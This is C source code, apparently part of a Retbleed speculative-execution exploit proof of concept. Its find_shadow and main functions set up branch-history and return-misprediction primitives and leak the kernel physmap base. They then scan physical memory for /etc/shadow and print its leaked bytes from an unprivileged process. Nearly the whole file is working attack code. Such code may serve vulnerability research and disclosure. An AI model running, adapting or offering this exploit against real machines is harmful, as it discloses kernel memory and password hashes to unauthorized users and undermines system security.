unsigned long find_shadow(struct mem_info *rb, spec_prim_t *a, spec_prim_t *b, int start_block) {
    u64 physmap_base = rb->kva - rb->pa;
    int rnd = rand() % phys_blocks.nblocks;
    while (1) {
        for (int q = 0; q < phys_blocks.nblocks; ++q) {
            u64 block_pa = phys_blocks.blocks[(q+rnd)%phys_blocks.nblocks]*MEM_BLOCK_SZ;
            INFO("Find /etc/shadow... (block %03d/%03d) pa=%09lx--%09lx", (q+rnd)%phys_blocks.nblocks, phys_blocks.nblocks, block_pa, block_pa+MEM_BLOCK_SZ);
            fflush(stdout);
            for (long try_pa = block_pa; try_pa < block_pa+MEM_BLOCK_SZ; try_pa += 1UL<<12) {
                u64 try_shadow = physmap_base + try_pa;
                if (do_retbleed(rb, b, a, try_shadow) == 'r') {
                    if (do_retbleed(rb, b, a, try_shadow+1) == 'o') {
                        if (do_retbleed(rb, b, a, try_shadow+5) == '*') {
                            SUCCESS("Find /etc/shadow... (block %03d/%03d) "
                                    "/etc/shadow @ %lx\n", (q+rnd)%phys_blocks.nblocks,
                                    phys_blocks.nblocks, try_shadow);
                            return try_shadow;
                        }
                    }
                }
            }
            /* if (q % 5 == 0) { */
                if (!has_signal(rb, a, b)) {
                    printf("\n");
                    ERROR("No signal ...\n");
                    exit(1);
                }
            /* } */
            /* DEBUG("\nmissed the secret!\n"); */
        }
    }
    return -1;
}

int main(int argc, char *argv[])
{
    kernel_text = 0;
    struct mem_info rb;
    cpu1 = -1;
    cpu2 = -1;
    u64 physmap_base = 0;
    int leak_perf = 0;
    int shm_i = 0;

    int c;
    static struct option long_options[] = {
        {"cpu1",         required_argument, 0, 'a'},
        {"cpu2",         required_argument, 0, 'b'},
        {"shm",         required_argument, 0, 's'},
        {"kbase",        required_argument, 0, 'k'},
        {"physmap_base", required_argument, 0, 'p'},
        {"leak_perf",    no_argument, 0, 'l'},
        {0,0,0,0}
    };
    int optidx;
    while ((c = getopt_long(argc, argv, "h", long_options, &optidx)) != -1) {
        switch (c) {
            case 'a':
                cpu1 = atoi(optarg);
                break;
            case 'b':
                cpu2 = atoi(optarg);
                break;
            case 'k':
                kernel_text = strtoul(optarg, NULL, 16);
                break;
            case 'p':
                physmap_base = strtoul(optarg, NULL, 16);
                break;
            case 's':
                shm_i = atoi(optarg);
                break;
            case 'l':
                // don't try to find /etc/shadow just measure performance
                leak_perf = 1;
                break;
            case 'h':
                fprintf(stderr, "Usage: ./retbleed --cpu1=<value> --cpu2=<value> --kbase=<kernel_base>\n");
                fprintf(stderr, "                  --physmap_base=<value> [--leak_perf]\n");
            default:
                fprintf(stderr, "Try %s -h\n", program_invocation_name);
                exit(1);
        }
    }
    if (cpu1 == -1) {
        ERROR("required '--cpu1'\n");
        exit(1);
    }

    if (cpu2 == -1) {
        ERROR("required '--cpu2'\n");
        exit(1);
    }

    if (kernel_text == 0) {
        ERROR("required '--kbase'\n");
        exit(1);
    }

    if (leak_perf) {
        INFO("Will check leakage rate\n");
    } else {
        INFO("Will try to find /etc/shadow\n");
    }


    srand(get_ms() ^ gettid());

    // we should try doing this with TSX actually.
    setup_segv_handler();
    for (int i = 0; i < ARR_SZ(bhb_ip6_send_skb_fast); ++i) {
        bhb_ip6_send_skb_fast[i].dst += kernel_text;
        bhb_ip6_send_skb_fast[i].src += kernel_text;
    }
    for (int i = 0; i < ARR_SZ(bhb_ip6_send_skb_slow); ++i) {
        bhb_ip6_send_skb_slow[i].dst += kernel_text;
        bhb_ip6_send_skb_slow[i].src += kernel_text;
    }
    spec_prim_t spec_prim_a, spec_prim_b;

    spectre_primitive_init(&spec_prim_a);
    memcpy(&spec_prim_b, &spec_prim_a, sizeof(spec_prim_t));

    if (ARR_SZ(bhb_ip6_send_skb_fast) < HIST_LEN) {
        err(3, "history is too small");
    }
    if (ARR_SZ(bhb_ip6_send_skb_slow) < HIST_LEN) {
        err(3, "history is too small");
    }

    int len = ARR_SZ(spec_prim_a.bb_spaces);
    u64 hspace_a = HISTORY_SPACE;
    u64 hspace_b = 0x488800000000UL;
    for (int i = 0; i < len; ++i) {
        u8* ptr = (u8*)(hspace_a + i*HISTORY_SZ);
        MAP_OR_DIE(ptr, HISTORY_SZ, PROT_RWX, MMAP_FLAGS, -1, 0);
        spec_prim_a.bb_spaces[i] = ptr;
    }
    for (int i = 0; i < len; ++i) { u8* ptr = (u8*)(hspace_b + i*HISTORY_SZ);
        MAP_OR_DIE(ptr, HISTORY_SZ, PROT_RWX, MMAP_FLAGS, -1, 0);
        spec_prim_b.bb_spaces[i] = ptr;
    }

    int nbranches = ARR_SZ(bhb_ip6_send_skb_fast);
    bhb_ip6_send_skb = bhb_ip6_send_skb_fast;
    if (rand() & 1) {
        INFO("Using ip6_send_skb_slow\n")
        nbranches = ARR_SZ(bhb_ip6_send_skb_slow);
        bhb_ip6_send_skb = bhb_ip6_send_skb_slow;
    } else {
        INFO("Using ip6_send_skb_fast\n")
    }

    setup_bhb(&spec_prim_a, &bhb_ip6_send_skb[nbranches-HIST_LEN]);
    setup_bhb(&spec_prim_b, &bhb_ip6_send_skb[nbranches-HIST_LEN]);

#define LEAK_PHYSMAP_OFFSET   0xb4e02dUL // uses _phy
    spec_prim_a.ret_path[0] = (u8*)(kernel_text+LEAK_PHYSMAP_OFFSET);
    spec_prim_b.ret_path[0] = (u8*)(kernel_text+LEAK_PHYSMAP_OFFSET);

    struct rb_phys *rbph = (void *)(1UL<<46);
    map_shared(SHM_PATH, rbph, SHM_SZ, O_RDWR);

    rb.pa  = rbph->phys[shm_i];

    // you only need 9 bits anyway
    rb.buf = ((u8 *)rbph) + ((shm_i+1)<<12);
    //DEBUG("buf %p\n", rb.buf);

    if (rb.pa != 0) {
        INFO("Reusing rb via shm, pa=0x%lx\n", rb.pa);
    } else {
        INFO("New rb, we need to leak pa.\n");
        INFO("use ./shmemer for this. Then come back\n");
        exit(0);
    }

    if (getuid() == 0) {
        // only for root users.
        int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);
        if (fd_pagemap <= 0) {
            err(1, "You need root.");
        }
        rb.pa = va_to_phys(fd_pagemap, rb.va);
        INFO("rb_pa = 0x%lx\n", rb.pa);
        if (*(u64 *)rb.buf != 0 && rb.pa != *(u64 *)rb.buf) {
            ERROR("We had a stored pa but it didn't match with reality");
            exit(3);
        }
        if ((rb.pa & 0x1fffff) != 0) {
            ERROR("Unable to get a THP. Maybe pressure memory could help?\n");
        }
        close(fd_pagemap);
    }

    pthread_t t_evict;
    pthread_create(&t_evict, NULL, _do_evict, NULL);
    usleep(100); // wait for eviction thread to get started? probably useless
    int cpu = cpu1;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(gettid(), sizeof(set), &set);

    if (!rbph->physmap) {
        if (physmap_base != 0) {
            rb.kva = rb.pa + physmap_base;
            INFO("Using kva = 0x%lx\n", rb.kva);
        } else {
            // We don't have physmap. We have to get it ourselves. This is a bit if a
            // mess but it will evenually work. min/median/max = 2s/5m30s/38m.
            INFO("Leak physmap (Retbleed)...");
            fflush(stdout);
            u64 t0 = get_ms();
            do_find_physmap(&rb, &spec_prim_a, &spec_prim_b);
            if (rb.kva == rb.pa) {
                WARN("Leak physmap (Retbleed)... Failed. Just try again!\n");
                return 1;
            }
            rbph->physmap = rb.kva - rb.pa;
            *(u64 *)&rb.buf[8] = rb.kva;
            SUCCESS("physmap @ 0x%lx t=%0.03f\n", rb.kva-rb.pa, (get_ms()-t0)/1000.0);
         }
    } else {
        rb.kva = rb.pa + rbph->physmap;
        INFO("kva=0x%lx ; physmap=0x%lx\n", rb.kva, rbph->physmap);
    }
    spec_prim_a.ret_path[0] = (u8 *)(kernel_text+LEAK_OFFSET);
    spec_prim_b.ret_path[0] = (u8 *)(kernel_text+LEAK_OFFSET);

    if (!has_signal(&rb, &spec_prim_a, &spec_prim_b)) {
        ERROR("No signal ...\n");
        return 1;
    }
    phys_blocks_init();
    u64 leak_me = kernel_text+LEAK_START;
    int nbytes = 1024;

    if (rbph->shadow_pa != 0) {
        nbytes = 128;
    }

    if (leak_perf != 1) {
        if (rbph->shadow_pa == 0) {
            // dont need this  I think
            INFO("Test side-channel %d bytes (Retbleed)... target=%lx\n", nbytes, leak_me);
            int errs = 0;
            for (int i = 0; i < nbytes; ++i) {
                int leaked = do_retbleed(&rb, &spec_prim_a, &spec_prim_b, leak_me+i);
                if (leaked == -1){
                    errs++;
                    printf("_");
                } else {
                    errs = 0;
                    if (isprint(leaked)) {
                        printf("%c", leaked);
                    } else {
                        printf("[%02x]", leaked);
                    }
                }
                if (errs > nbytes/2) {
                    printf("\n");
                    ERROR("Too many errors\n");
                    return 1;
                }
            }
            printf("\n");
        }
        // if we geet this far probably things are wokring ok and we can
        // continue.
        nbytes = 128;

        if (rbph->shadow_pa == 0) {
#define ABS(x) ((x)<0?-(x):x)
            int ncpus = ABS(cpu1-cpu2); // this is usually true..
                                        // assuming using all cores, distribute search locations evenly
            int start_block = phys_blocks.nblocks * MIN(cpu1,cpu2) / ncpus;
            leak_me = find_shadow(&rb, &spec_prim_a, &spec_prim_b, start_block);
        } else {
            INFO("Using shadow hint %lx\n", rbph->shadow_pa);
            leak_me = find_shadow_range(&rb, &spec_prim_a, &spec_prim_b, rbph->shadow_pa, CHECK_PAGES);
        }
    }

    u64 t0 = get_ms();
    INFO("Leak %d bytes (Retbleed)... target=%lx\n", nbytes, leak_me);
    int errs = 0;
    for (int i = 0; i < nbytes; ++i) {
        int leaked;
        if (leak_perf != 1) {
            // if we're not measuring perf, we can afford to be more accurate
            leaked = do_retbleed_retry(&rb, &spec_prim_a, &spec_prim_b, leak_me+i, 30);
        } else {
            leaked = do_retbleed(&rb, &spec_prim_a, &spec_prim_b, leak_me+i);
        }
        if (leaked == -1){
            errs++;
            printf("_");
        } else {
            errs = 0;
            if (isprint(leaked)) {
                printf("%c", leaked);
            } else {
                printf("[%02x]", leaked);
            }
        }
        if (errs > 1000) {
            printf("\n");
            ERROR("Too many errors\n");
            return 1;
        }
    }
    printf("\n");
    SUCCESS("Leaked %d bytes in %0.3f seconds\n", nbytes, (get_ms()-t0)/1000.0)
    return 0;
}
